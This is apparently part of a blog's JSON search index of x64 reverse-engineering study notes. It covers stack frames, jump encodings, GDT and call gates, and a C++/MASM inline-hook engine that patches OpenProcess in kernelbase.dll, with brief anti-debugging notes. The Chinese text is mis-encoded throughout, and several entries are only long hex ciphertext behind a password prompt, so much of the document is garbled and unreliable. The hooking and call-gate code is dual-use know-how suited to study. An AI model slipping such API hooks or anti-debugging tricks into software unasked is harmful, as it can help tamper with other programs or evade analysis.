66dbd7a73d4183eef2130c6af270b84ff6b553350e1a8d9c52ed2df68790bb8b37f50d4070bb9f58683307438ff2bdfbf181344fa230d7f7691f0ddad86b7c6df56efe67664887322a5163b4d005461652816cf5159ee5d9bd50d2fb680dc87c72ae23f79003e7b4a542ec6cc5d95af2bafdf1883dd577d0eb4933f62452e3a174421f362245f19ea388e5ec8e7a3f413b22cbc69c6b1dd33c54a427dd9b43be51f1f39bd3ef378bf15c61b1201c52ade78ab6353d80bd54f8863db9ceaaf38098f1e936c9d38099ab35838f09aa1a5fc12578ed48f6521572d08a9fe9c87ba5c129ec5ec888d56564d28860fe99afae456cf9b102a59ac2de21fce89d19e0262a0f3502c8c435e53c79d245f6da52312","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-10(%E5%BC%82%E5%B8%B81)/"},{"title":"x64ï¼ˆå­¦ä¹ ç¬”è®°ï¼‰ - 10(å¼‚å¸¸2)","text":"å—¨ï¼Œè¯·å‡†ç¡®æ— è¯¯åœ°è¾“å…¥å¯†ç æŸ¥çœ‹å“Ÿï¼ 62112dfd54028f379e10a0319ea6555055d8ffa54e80d5848f0b11971e3b1e6cccb52302b69f4a8a7657bd652ae2f2a3778fe18ef5d00c500159c761a80abdc7ca4bbbe12bbce4cf25e141ab95d06165238ad8a4bd3e78ea9e5f37eee118a28165e63d2b3a2a8ec06fbb30b9d40c567ec7d673bb331f840a0edf6f51cd6863b0d8682db16d2f9f04b9600ca0e3dbf3b3119570c89cedcd8255448f70ce001295673279cf0cedf800fb8dceba42d367bd17b86cd3aac67450de9abcaf27954becd03d536dca60851b213ebcfea99cc0964a8f23847cccfbcce1e1b72a101b4e218883dcf0bccd8a53c71da74c2ad844e68257bbe5b3d3bdf3fcadd3f620d20012c7d5a608e774fe34ff21b7e158ff4c8c0b21c406ab2ea66191feff2642b59f9f81b10ef8df87856ab69e4fedf0469fd0dbef85276d27bff485e73d8127d8ac84f2c6f797e9c3fe9a7d5bfc995ea37eaab0ad383c49e975762966208dee21c6c6617e6fa8dac0a80d2a9aa728f2abe8219becbd23cef8663275d0f25219cedfabbe3cc311f6ecc33c2ab6ddf646cdc35de3471597e8a0c66976ff9beca84b304c7f988357aec84b6584fc9231f2cfde12d8ef3d3ac568b2dfd28db888f4fd67985dc1639036d440d3f759af866d560de8c60267a933496da5395575fc0daed3b0d384bd2c3fa055e3a21db17ea0c8b9ab1f8c190a28e107130712bc8444b44356433018805fe185b74333367ea66f95ff0ea425227391a8c62dde5a0d76cf563c","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-10(%E5%BC%82%E5%B8%B82)/"},{"title":"x64ï¼ˆå­¦ä¹ ç¬”è®°ï¼‰ - 10(å¼‚å¸¸2)","text":"å—¨ï¼Œè¯·å‡†ç¡®æ— è¯¯åœ°è¾“å…¥å¯†ç æŸ¥çœ‹å“Ÿï¼ 40f6ac0bb6a9833e879b3d8a01d5930054fdabb808c585db3dfa6ac57580680251eb09fb5209e9efc446a39c06de46a21b2998d1b1e211300a94d44f014b9186b633cf0d0215ba0bc4d167edc36a7625f60740b3d927a6b5a56209296f2868c9e01eb18d7e9d891cc6650e8da9ae6dc81ca6de2c221fb1dd4bfdb47618939c081d30098d8c0510ca22ce40ea73effc20d312d81de69e6bb2919218e0dda768a1ee990bbaf0b4345c6fbc23f1a06d13f8b43dde31c4f8e582e2d69a4186c5c5dbc2a2e47e7ac02bacc936bc1f4d8077e039292fe73b781e8d6d4bf500ee73e2956f135a0d8d9f9f4a15cf3efec870c0ea7f7f2d7e2dad538da460873ab2a0bf35b29e9f18d5bd7a2f7f060b6c4b03068b0f4081a850052f6e1fd5f9fb92464b9f49bfcd0d4599474970f7152d75ca7230f0e636713d25e2712e67f9099ac0c2e65427d7ed89736939636d195b851e096a3f53f1c10f7286d4bb1b1c8a48a967a858832475da4a1f91e8f52786cbaef374720d314690a6eea2eec73bd4c4b4758db7f8f6717ff8ec4d6d0c8a863183f791f23938775f00e912d6462a0a08c9ae83d622dde12d3ceb3954b1c00dc7162ba39d56433a7780c3b1347a654cf1754e889136c09391c8a9396c82c68d32f9bbe183353e04202c616941be95c0d90df31b","link":"/2020/08/27/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-12(%E8%B0%83%E8%AF%95)/"},{"title":"x64ï¼ˆå­¦ä¹ ç¬”è®°ï¼‰ - 1(å‡½æ•°é€†å‘)","text":"è¦ç‚¹ åœ¨x64é»˜è®¤ä¸‹ä¸ä½¿ç”¨rbpå¯»å€ï¼Œä½¿ç”¨rspå¯»å€ åœ¨x64ä¸‹æ ˆæ˜¯é™æ€çš„æ ˆï¼Œå‡½æ•°å¼€å¤´ä¼šé»˜è®¤å¼€è¾Ÿå¥½æ‰€æœ‰çš„æ ˆ æ ˆå¸§ - æ ˆé¡¶ åˆ° æ ˆåº•çš„é«˜åº¦ x64ä¸­æ ˆå¸§æ˜¯é™æ€çš„ï¼Œé»˜è®¤å°±å¼€è¾Ÿå¥½äº† åœ¨x64ä¸­ ä¿®æ”¹rsp å¯èƒ½æ˜¯ sub ä¹Ÿå¯èƒ½æ˜¯ lea åœ¨x64ä¸­ å †æ ˆå›æº¯ éœ€è¦è®¡ç®—rsp æ¥å›æº¯å †æ ˆ åœ¨x64ä¸­ ret ä¸€èˆ¬éƒ½æ²¡æœ‰å‚æ•° å› ä¸ºæ ˆæ˜¯é™æ€é»˜è®¤å¼€è¾Ÿå¥½çš„ 48ä½æœ‰æ•ˆåœ°å€æœ‰å¤šå°‘æœ‰æ•ˆå†…å­˜å‘¢ï¼Ÿ2^48=40000G ç‰©ç†åœ°å€æœ‰æ•ˆå†…å­˜ 2^40=1024G ç‰©ç†æœºçš„ç‰©ç†çº¿æœ‰å¤šå°‘è·Ÿ 64ä½ä¸‹ E9 call æ˜¯æ¨¡å— call ä¸Šä¸‹2GèŒƒå›´ 64ä½ä¸‹ è·¨å¤§åœ°å€è°ƒç”¨ 1234push rax; 1ä¸ªå­—èŠ‚mov rax,0x123456789; 10ä¸ªå­—èŠ‚push rax; 1ä¸ªå­—èŠ‚ret; 1ä¸ªå­—èŠ‚ 123push rax; 1ä¸ªå­—èŠ‚mov rax,0x123456789; 10ä¸ªå­—èŠ‚jmp rax; 2ä¸ªå­—èŠ‚ å› ä¸ºä¼šç ´åå¯„å­˜å™¨æ‰€ä»¥åˆ°ç›®æ ‡åœ°å€åéœ€è¦pop rax; FF 25(FF 15) ç»å¯¹è°ƒ jmp + ç»å¯¹åœ°å€ FF 25 00 00 00 00 XX XX XX XX XX XX XX XX ï¼ˆ14ä¸ªå­—èŠ‚) åœ¨å¤´éƒ¨ï¼ˆå°¾éƒ¨ï¼‰æŒ‚hookéœ€è¦6ä¸ªå­—èŠ‚å°±å¤Ÿäº† æ³¨æ„ åœ¨å†™ä»£ç çš„æ—¶å€™ï¼Œå°½é‡å°‘ç›´æ¥ä¼ é€’ç»“æ„ä½“ï¼ˆæµªè´¹æ€§èƒ½ï¼Œä¼šå¤šæ¬¡å¤åˆ¶ç»“æ„ï¼‰ åè°ƒè¯• å›æº¯å †æ ˆ çœ‹çœ‹æ¥æº æ˜¯ä¸æ˜¯è‡ªå·±æ¨¡å—çš„å‡½æ•° ä¼ªé€ è°ƒç”¨ è°ƒç”¨å®ŒæŒ‚hook / veh åœ¨ä¿®å¤","link":"/2021/07/10/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-2(%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91)/"},{"title":"x64ï¼ˆå­¦ä¹ ç¬”è®°ï¼‰ - 3(x64InlineHook)","text":"inlineHook è¿‡ç¨‹ é€‰æ‹©hookæ–¹å¼ è·å–hookåœ°å€ï¼ˆå¦‚æœæ˜¯å¯¼å…¥è¡¨çš„å‡½æ•°æ³¨æ„jmpï¼‰ è®¡ç®—hookæ‰çš„å­—èŠ‚ï¼ˆæ±‡ç¼–å¼•æ“ / æ‰‹åŠ¨è®¡ç®—ï¼‰ ä¿å­˜è¦è¢«æ›¿æ¢æ‰çš„æ±‡ç¼–ï¼Œè®¡ç®—è¢«æ›¿æ¢æ‰å­—èŠ‚ä¸‹ä¸€è¡Œçš„åœ°å€ æ„å»ºhook shellcode shellCodeæ›¿æ¢æ‰ç›®æ ‡åœ°å€çš„ä»£ç ï¼ˆä¸ºäº†ä¸ç ´ååŸæœ‰å¯„å­˜å™¨ï¼Œéœ€è¦ä¿å­˜å½“å‰å¯„å­˜å™¨ï¼Œç«å“¥æ¨èçš„æ˜¯ æ„å»ºçš„shellcode ä½¿ç”¨asm pushæ‰€æœ‰å¯„å­˜å™¨ ç„¶åæå‡æ ˆé¡¶ è°ƒç”¨è‡ªå·±çš„å‡½æ•° æ¢å¤æ ˆé¡¶ ç„¶åpopï¼‰ æ„å»ºè°ƒç”¨åŸå‡½æ•°çš„ shell codeï¼Œ æ‰§è¡Œè¢«æ›¿æ¢æ‰çš„æ±‡ç¼–ï¼Œç„¶åjmpåˆ°ä¹‹å‰å­˜å‚¨çš„åœ°å€ è¦ç‚¹ å› ä¸ºåŸæœ‰calléƒ½æ˜¯ç›¸å¯¹åç§»ï¼Œå¦‚æœhook callç›¸å…³çš„ æ¯”è¾ƒéº»çƒ¦ ä¸èƒ½ç›´æ¥hook å‡½æ•°çš„åœ°å€ å› ä¸ºå¯èƒ½ä¼šæœ‰jmpè·³è½¬ï¼Œç›´æ¥è°ƒç”¨çš„å‡½æ•°çš„åœ°å€ å¯èƒ½ä¸æ˜¯å‡½æ•°å¤´æ˜¯jmpéœ€è¦ä½¿ç”¨GetModuleHandleA ç„¶åå†GetProcAddress è·å–åˆ°å‡½æ•°åœ°å€ æ³¨æ„ åœ¨å†™ä»£ç çš„æ—¶å€™ï¼Œå°½é‡å°‘ç›´æ¥ä¼ é€’ç»“æ„ä½“ï¼ˆæµªè´¹æ€§èƒ½ï¼Œä¼šå¤šæ¬¡å¤åˆ¶ç»“æ„ï¼‰ å†ä½¿ç”¨ xx xx xx xx xx xx xx xx ff 25 f2 ff ff ff è¿™ç§æ„é€ è°ƒæ•´çš„æ—¶å€™ éœ€è¦æ³¨æ„ åœ°å€ä¼šè¢«å½“æˆå‘½ä»¤æ¥æ‰§è¡Œ åè°ƒè¯• å›æº¯å †æ ˆ çœ‹çœ‹æ¥æº æ˜¯ä¸æ˜¯è‡ªå·±æ¨¡å—çš„å‡½æ•° ä¼ªé€ è°ƒç”¨ è°ƒç”¨å®ŒæŒ‚hook / veh åœ¨ä¿®å¤ ä»£ç InlineHookEngine.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#include &quot;InlineHookEngine.h&quot;#include &quot;LDasm.h&quot;typedef HANDLE(WINAPI* OpenProcessProc)( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId );EXTERN_C HANDLE Hook( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId);EXTERN_C HANDLE NewOpenProcess( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId){ printf(&quot;-------------------------------------\\r\\n&quot;); return 0;}char* oldCode;uint32_t GetAsmLength(PVOID psrc){ ldasm_data ld = { 0 }; uint32_t len = ldasm(psrc, &amp;ld, is_x64); return len;}UINT GetFuncOffset(PVOID funcAddress,UINT needOffsetNum,UINT currentNum = 0){ PVOID newfuncAddress = (PVOID)((UINT64)funcAddress + currentNum); currentNum += GetAsmLength(newfuncAddress); if (currentNum &gt;= needOffsetNum) { return currentNum; } return GetFuncOffset(funcAddress, needOffsetNum,currentNum);} EXTERN_C int main(){ //1.è·å–hookä½ç½® HMODULE hModule = GetModuleHandleA(&quot;kernelbase.dll&quot;); PVOID64 funAddress = GetProcAddress(hModule, &quot;OpenProcess&quot;); //2.è®¡ç®—hookæ‰çš„å­—èŠ‚ UINT offset = GetFuncOffset(funAddress, 6); // LDasm //3.ä¿å­˜è¦è¢«æ›¿æ¢æ‰çš„æ±‡ç¼–ï¼Œè®¡ç®—è¢«æ›¿æ¢æ‰å­—èŠ‚ä¸‹ä¸€è¡Œçš„åœ°å€ oldCode = (char*)malloc(offset); memcpy(oldCode, funAddress, offset); ULONG64 originalFuncLastAddress = (ULONG64)funAddress + offset; //4.æ„å»ºhook shell code //å‡½æ•°å¤´éƒ¨çš„hook åˆ©ç”¨å‡½æ•°å¤´éƒ¨ç©ºç™½çš„å­—èŠ‚æ¥æ“ä½œ éœ€è¦åˆ¤æ–­å‡½æ•°å¤´éƒ¨ç©ºç™½å­—èŠ‚æ˜¯å¦æœ‰8ä¸ª0x00 / 0x90 / 0xCC char shellCode[] = { 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0x25,0xF2,0xff,0xff,0xff }; *(PULONG64)&amp;shellCode = (ULONG64)Hook; //ä¿®æ”¹åŸå‡½æ•° PVOID64 hookFunAddress = (PVOID64)((ULONG64)funAddress - 8); ULONG oldProtect; if (VirtualProtect(hookFunAddress, USN_PAGE_SIZE, PAGE_EXECUTE_READWRITE, &amp;oldProtect)) { memcpy(hookFunAddress, shellCode, sizeof(shellCode)); VirtualProtect(hookFunAddress, USN_PAGE_SIZE, oldProtect, &amp;oldProtect); } else { return 0; } //5.æ„å»ºè°ƒå›å»çš„shell code char CallOrginalFuncShellCode[] = { 0xFF,0x25,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, }; PVOID CallOrginalFunc = VirtualAlloc(NULL, USN_PAGE_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(CallOrginalFunc, oldCode, offset); *(PULONG64)&amp;CallOrginalFuncShellCode[6] = originalFuncLastAddress; memcpy((PVOID)((ULONG64)CallOrginalFunc + offset), CallOrginalFuncShellCode, sizeof(CallOrginalFuncShellCode)); //6.æµ‹è¯•è°ƒç”¨ HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 10840); printf(&quot;å¥æŸ„ä¸º %llx\\r\\n&quot;, handle); auto OrginalFunc = (OpenProcessProc)CallOrginalFunc; handle = OrginalFunc(PROCESS_ALL_ACCESS, FALSE, 10840); printf(&quot;å¥æŸ„ä¸º %llx\\r\\n&quot;, handle); return 0;} hook.asm12345678910111213141516171819202122232425262728293031323334353637383940414243444546.codeNewOpenProcess proto;Hook proc push rax push rbx push rcx push rdx push rbp push rsp push rsi push rdi push r8 push r9 push r10 push r11 push r12 push r13 push r14 push r15 sub rsp,120h call NewOpenProcess add rsp,120h pop r15 pop r14 pop r13 pop r12 pop r11 pop r10 pop r9 pop r8 pop rdi pop rsi pop rsp pop rbp pop rdx pop rcx pop rbx ;pop rax add rsp,8 retHook endpend","link":"/2021/07/10/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-3(X64InlineHook)/"},{"title":"x64ï¼ˆå­¦ä¹ ç¬”è®°ï¼‰ - 4ï¼ˆx64ä¿æŠ¤æ¨¡å¼ï¼‰","text":"x64ä¿æŠ¤æ¨¡å¼ GDT ç°è‰²éƒ¨åˆ†æ˜¯æ— æ•ˆçš„ è®¾ç½®äº†ä¹Ÿä¸ç®¡ç”¨ 64ä½è°ƒç”¨é—¨ï¼š æ®µ æ™®é€šæ®µï¼ˆä»£ç æ®µ/æ•°æ®æ®µï¼‰ 8å­—èŠ‚ ç³»ç»Ÿæ®µ 16å­—èŠ‚ è¦ç‚¹ é»˜è®¤æƒ…å†µä¸‹Cpuæ˜¯æ²¡æœ‰å¼€å¯x64çš„ é—®ï¼šæ“ä½œç³»ç»Ÿå¦‚ä½•å¼€å§‹X64ç­”ï¼šIA_32_EFER(C0000080)å¯„å­˜å™¨çš„è®¾ç½® MSR ä¿©æ¬¾CPU IA64 åªæœ‰64ä½ç¯å¢ƒï¼Œä¸å…¼å®¹32ä½ç¯å¢ƒ IA32 x64ä¸x86æŒ‡ä»¤åŠŸèƒ½ï¼Œæ··åˆCPU 64ä½ä¸‹ R3-&gt;R0 çš„syscall é»˜è®¤ä¼šæŠŠSSæ”¹æˆ0 è¿™æ—¶å€™è®¿é—®ä¸œè¥¿çš„æ—¶å€™ä¼šæ— æ•ˆ å®ƒå¤„ç†å¥½ä¹‹åæ‰ä¼šæ”¹æˆæ­£å¸¸çš„å€¼ gdtä¸­ ä¼šæœ‰ä¿©ä¸ªcs 1ä¸ªç»™x32ç”¨çš„ 1ä¸ªç»™x64ç”¨çš„ FS x64ç³»ç»Ÿä¸Š æè¿°çš„æ˜¯ x86è¿›ç¨‹çš„TEB32 GS x64ç³»ç»Ÿä¸Š æè¿°çš„æ˜¯ x64è¿›ç¨‹çš„TEB64 x64ç³»ç»Ÿä¸Š R0ä¸‹ FSæ²¡ç”¨ GSä»£è¡¨KPCR æ³¨æ„ 64ä½è°ƒç”¨é—¨ä¸æ”¯æŒå‚æ•°","link":"/2020/08/26/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-4(x64%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F)/"},{"title":"x64ï¼ˆå­¦ä¹ ç¬”è®°ï¼‰ - 5ï¼ˆx64ä¿æŠ¤æ¨¡å¼ - è°ƒç”¨é—¨ï¼‰","text":"x86ç¨‹åºè¿›x64è°ƒç”¨é—¨ 123456789101112131415161718192021222324252627282930313233__declspec(naked) void callCate(){ //å½“è¿›å»è¿™ä¸ªå‡½æ•°æ—¶å·²ç»å¤„äº 64ä½ç¯å¢ƒ __asm { __emit 0x0f; __emit 0x01; __emit 0xf8;//swapgs __emit 0x0f; __emit 0x01; __emit 0xf8; //swapgs __emit 0x48; __emit 0xcb; //retfq retfq; }}int main(){ char buf[6] = {0,0,0,0,0x73,0}; //æ‰‹åŠ¨æ„å»º gdt __asm { call fword ptr buf; }} x64ç¨‹åºè¿›x64è°ƒç”¨é—¨ æ„å»ºGDT æ„å»ºå‘½ä»¤ 1234567891011121314.codecallCate proc nop call fword ptr [rcx] retcallCate endp;exeCallCate proc swapgs int 3 swapgs retfq; retfq æŒ‰ç…§8å­—èŠ‚è¿”å› retfæŒ‰ç…§4å­—èŠ‚è¿”å›exeCallCate endp;end KTSS64 64ä½ä¸‹ GDTä¸­xxxx8bxx`xxxxxxx xxxxxxxx`xxxxxxx æ˜¯tss åè°ƒè¯• ä»32ä½ä¸‹æ‰§è¡Œ64ä½ä»£ç  ä»64ä½ä¸‹æ‰§è¡Œ32ä½ä»£ç ","link":"/2020/08/26/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/x64%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-5(x64%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F-%E8%B0%83%E7%94%A8%E9%97%A8)/"},{"title":"x64ï¼ˆå­¦ä¹ ç¬”è®°ï¼‰ - 6ï¼ˆx64ä¿æŠ¤æ¨¡å¼ - å†…å­˜æ˜ å°„ï¼‰","text":"å—¨ï¼Œè¯·å‡†ç¡®æ— è¯¯åœ°è¾“å…¥å¯†ç æŸ¥çœ‹å“Ÿï¼ 0afe9fc8d166d58c7a0f08614e18834236e8645514f04529980f51c2022f9c5eed7676681bb0d070f818d12a19382e0a76d27810c31d8f270565ab8e3e4c22b0bb4888ee0837055e2bf9ad2a8571cfa17dd5f45b924ed485deea2f919ddc1866c7f10fcd562de4717a5f447facffe6cb338bc7491ae97fe44d341651ea9841a4f553fa157779ea85772fb0d13cc924fa254c8b11b4e794289c32ee854fcbe6d45121471957f353f8b21d245b11af9bece943f4e45cb0e012e5045c615c58a8284e75f20174ab7fa61467f3c3da4226851ac67098a88b5a04298af1a7c7c7c18afc37830cfedacd884626a8be72a54482efa4a22f37364e1adb6196d4b6a8299305e61f8f864535e13dd1944ba8ddb4f3a959f5eefc21210c51308e99f80bf44e85c9b74585dce663a0c6f052b9402de921213703af887331f1b251153c8fce59140ba37baf377454e1bcd9b9e4f506988a1e758e721baa00068beb8efdefaaa12b630503e151762a66208a7ba2e70e73a72649612f10706d347a96a9d1e054f866bab5dadc685e5ed6ce7b37344b48b6e8ef731b7d5be401319bf8d23bca21afa3809cd8d278a848711935e9f812548a79038c4f47486d8a02f484539dd1a778340707135ab5429a40093457bdf32b6fe577b8a9a6c1500777239cb9c58969510b0943de961adf69b4fc01f0781b63766ef433e900d0e1edabdc0cffc0fb53455b84e136c6e970778403aa4b73cad0affa48a3714b3fce4c62d7c04327b69226f8d6d6b33bbc961ce916df9b13df5d88916f6b2a7a1d036df918155cee730d14e105b2eceff329caa1e23017743fdaae711f42d26065e54f229c1e2ede451d45602080e43c2e6be527d8d950043b004a4546e677fcc28584ee4cba02adf241661a42ce42a53ee8c418262754c117d4bba767b709e0b0591a632a21de8684c525780e3de1d248261dc75f6bde48732e30f8783a641bc7f40e885dd62d4df1f86fb0fb8bc2169e8228f593198edd23da95759f8837d91758d9bde3e99aa625a5c7f06c6a22d57c2d4d8cb10df1b8d05e176c7e9abc77df665307d0418f31f21d835c113b0fadfa047a4a14b36f337328182e9979c34f274336fa9698ae9d5e658dc41e827091a6ef3bbc19f0f40f6a87c72dcb0da8b29c6a704af6c30b3a830df92228d3448d5594ef2c788170832f629d9b71c3a9db867f82f6accd0d098b6bab2053070be5a8c728a48fc3a130ca5b094d9d60104b92ddcd8777802397fb4d0b723c7596c2a8c034b57a3239ec3c1a318bf8e6c9f7884d848bd4db3086f934e5f9df44d87a8bfad4bf26b385be32fe13bc39d05838f4a07aeecf4c63422e6ef7f93fd03a9c91e90e1e71cf862455dd70cab8d9807955b418738fa6b22813c1639a152b0fd6c8cff059b3d4a54be5efa3d93ecf49e03f1a265bc9a8f7a55e000466b7aeb3c1f085c22c7878cab9fbc1e0e6687acdea2d0edff584fc6277aa3a936f529ff36291b2da9620180d6390f34c7e62695db30ebef3ecc36c906d1ef459aa70d861183b368acfacc7d56c08145015e1a9514df897544bb332be03ea0fb4b15860763af909edcfb9b784b2cfd401988e0a7c53fd16d23bfaf0cdc65f89a739270c66922ee55b23d1dd036b0fd9d00a98f50960895c97acbbf1ccf14c5a412fcae17c40d6aba218e7ef543c9e5995a87d440c492d608161aaecc45763c53e8519008600814d78d4221176cf9e7f0d2994b1eef16083dce33a467c8f377c24f2ad6a023632e11e8518fba78e2c14e57e0f6a3e70e02acf146a0acc8e102d38c3623023d2298df29e638ac4fe4db6efbc4339eb0e113d9a4a25101296692821d14d6a6ad8ca345de0057ddeab37f97fba45824eb069f11939fc882526cfb347893c4e6f4298d3c1dd929fc40ca9c75f7e411bf1628125e0b21164ab36e0c620586242ce99b75d3976022f61214c160b957d0eb3b4ca98930a8199fe88d0cf09b0496c3f89c309a1ed0c860bc384a9f94f2a8b07aeaa3c1cf5f7235d6f733b84ccbb2a2a2e584a1a8f9974816bdd25276c322a4c9b16d368ffa20efcca0559d99bf17fae40bba22b9f5ef0fa39d42226dff8e2bf4dd7c61bfe74d910880ae600c53a64135bd9846eb62edaf9a7d2fe30089be81caf52d3b9e283ba86493d69d8bcfd4be6e9bd5dc8236e534e65945bd950ff9108e0a32dbea90df4fffb6433146574d7e90c8cc3fd1e2f40abd7fb43b32521dc0a0423efd0c8e5b7dd044e5e00b158d1aff0f92baf30ca044516f0d94fc7a747fabc257d9103ff91a9090738d199faaa10abab73fe08c5440148bbe8aa2bc9a90581c36f6656107d18f2c84394acf8158e98e0d9426b205f7c53edd94557c2d3116d74e34e5f3a81baef8e2152f855d0ce6aa4864f16271be09fcfdc10133cbc8ab476edaec894f23597cf0798ac3803a1d5c99d9875f10d409d177565e5f640735f54b8a8b753d0cdd19cf46f320b7957e7dcf44ee16db14c936b11819aaf0318690db9b3210f04c0ce0d2d4b527070c9c2745b7da9131a289bb831ff0ca0e3fa6af0feed0e75621f5effa392bef639568d6a5076445937b430fa818a80c9bb62a8b41f5da6815ea9cbf1bf53d2034d93a2bbd4482e74a6e16655c53d82073adf59b61c8936bb7d5e7ca0e158cccf5cf3c7c60f8bb9747faa6281bddc523a9dddad0007a8e7604e0c75ae43d4447dc317720654d1b7ecfa33e7c026276d493dbd4d9c842d0f82eb5eadbbe89e105daad3bfb2d712c998ae54be99146bf1157058700369f86061e2764e7c9b0d0cdf7a6d914ba409b3ed7bc5da83cd49714194c9e0bc06c5b5036c881bd74cf013d2acaea156612d7f196d7bc712c6889269bf0b022f9f7b2df47c1010653a2516cdda00042a8535b05437ffd0e9027f5aec70c1bc352d734f3f1f8acbf04d438f2f0422d9e55885e2e3747e2c5baf69eda86dc659349caf00f40bb07116ec92f80ed3d27e546b2ecfb32d177562c3d2fb840e60100d36e89a8a5e1821a506496cda52cbeb08c61755dda22eb7c7ce3bd65710061e9583039fa37d493f8dc97eb018b3ae4b572aac61b417c040f4e034ed4cbf7e0d9399e0da545230a7cc6957527ae0ec85cdb9616921d0395574d2983bf28791922b95ac5a4f342a9fceb2a6ee817f0e435a68cbdeb6299fee84f27503163a1576e1f08731964b8f6bf098e9f44fcd9908b850e4ae281c69df8a5f66afbe8d8ae4f12bbd3fdb7a45f590382d17d59386a2b61a666b292f2b523e995f3c5cd1492ee0b826a78aa9a28562b21783670622bfc182076cd887b6f18c9a7570250a61264de4561d4005d81f3f1f55f2bc5f16c9c095c39e2a957b45c103d00448680edad09234da0f90e0a26fe9d1549782ed78e9c2b7ce4ecc7690df08f8af5d909dc6295ba72cbc491633e2b9ac2dc904008cedcfbf7046a5b0397937ab0d0967ae3907133a08304b89d9425e2290da0cec033ad205a10c973d82f86c8f7093c000f0421d317e4db42b37d723a7f51efcf34bfb1f54be0b39507b4a578d31106b9f54ba1a5e55413c77b75bc173f42513733d83679ad00c6b3ef4035099ba298f2bb9c4820be44f24038fe11bbf55e25986185bf08b937f29aa67192c072916243a7a982403dc832977edff446a2ab3a5ba4ad6a4be2601c9d253e745d969272c6dce372cd4e1aad3fb63aea987bc1372be1e14e7c359abdeaac949192f0258211be2657f03ca4236fd19956f404f430c7b67853f011afbc196fa3b0b56414acf1983016989ec1812dea8777e059139cec211db0efe7e8336e3960958214525a2a053fc524d5363f65fee696247f2a95cd5582b46cd076e4d30724071974770343221de23ba0e4cdc66de8ffedc1d1610f7cb12284e82e8c228c55ca80b35fef0621f689c50f3d501d9c7f09b1dffe2ad7461041c8374d466b7cee93590f77fa3c40993d49714945ed8b7a77cd862e5ec31eddfd7b565b7bf62379be3fd65c7197bf912302de09985cdb8098b7af80d0dbba98f7585d710f73f61a94eeafac3c5db2ebab561730c1bd09dc2379f5400ad16f230f81259bc7f474fc3eca25685086566282ad47f8bb572d4f4bb1092497cb37c146891987fb2e25eca54d2063bcd3146525c9873733366282cbc762fa937d650e8c92a1d360ca5b9bf99372ee5514a66e7109a7fa6df2af3b45c64f522928cc7a0ee0088574939ea8d39abed55df3b54762b174df2ec9e5608af9602fbc3fe446d83df570ba506bded14fa08f7a159ad81fe95947678661cb7d548172fd479285d2a76b6682bb62352c1cdaad36831bd60d1fb08f617741c03f6b322d9a5a945ec0b842a68104c42b2e3c4b4f77ff1e39591a9edee8448474d9e46f925dd074f04b71dc54b6f3c8188d0ebea40fa901b0e9c593b45aa7962d8753cbcc14e593d27bb7599213e909b09123a4a538463fc4a7235c324118c35820ec9b28d81d4cbb8b6fd6dc7e3229a0cc13e258c50cbfc11d6e24affb99f4e9064bcc34a2c787b8743fcb9315f80d85959a2ef9862910673391ba02f588e161612b55a6bd670df509dac8d25e2f407b760ba00813ecf921d791b4fbb10cfd52418bd7f882caeada2620e2e5fb9a677e20a7cd28d40cf5800e0b545bc42fcde64cd729167c703f7203c53344d7791b8dca5f5e31ed34137f38855a4ad0775474204add5d9aab8d5551d4e0e3c9702cbb9e48f23062ee386f301d48a1e3102810e6956a37443a81633840f5f7c7328f511aaa87460d48995bbbbda000ba5b61f91d9eb089addd73e45b623585e40dec09a38b503a4b173c7370f5da0662be8b2f7fcc6469a0bb15d1a7d484fa546c421b0a6b858d2072397536efe4c8b0f00c7867d3e16e6a6afcb6230e9aaddaea5f797d1e8b4510dfdbdee0f43ada48c5d4bba4d1e44475f8c113d9361f00f7c8061e08a444332204c1f65333bb2952b21a2951ad97e7b02fc729e2a51da8b8d6b1c1dc028ff7a820af5aab8f85580b930f68daf919c92d5fcb8590df2817af28dffb99582f44903119b574bb1289c35623c1d83465abfd5b8c0f5cfc19c6d0c7f5929c14e54f9c4b93b998de6bf4393fc98ef0a52fa32ab292a8a7aeeff32e72f3b1fd11852f994acff1396e044ae2cf72788febc85e1bd6a40e64e7a2fdbefa35a09d43a017b514568a1040e2e64fc883814489e60db169480ba57a89ae1c9bb840de17456fa836cba04dbb69cc8a9534b62fa004e79a01111da5d2ea1a4572ab0c067d2770af605b17d98343fde933ed3402c0695beb2532b445296b73f661c2cd7c1afd9076b13b3d2d8c5ed151da1ba83a7fbf8ea80d5d48aa3f501d212c59fcdce768344136d9a11058389b5acd95f704ab1645e9ec40410581906c6f2b6ee53b9addc951bac78c98981b4a379cd9ca2e3979728d34a4d69df6fa147c8d0c8dc342cecfdb48a03213454ea7c294d32d4525ed421ea8dc8dca4c67c50f1af8dac5028882e5bac0f615c63ce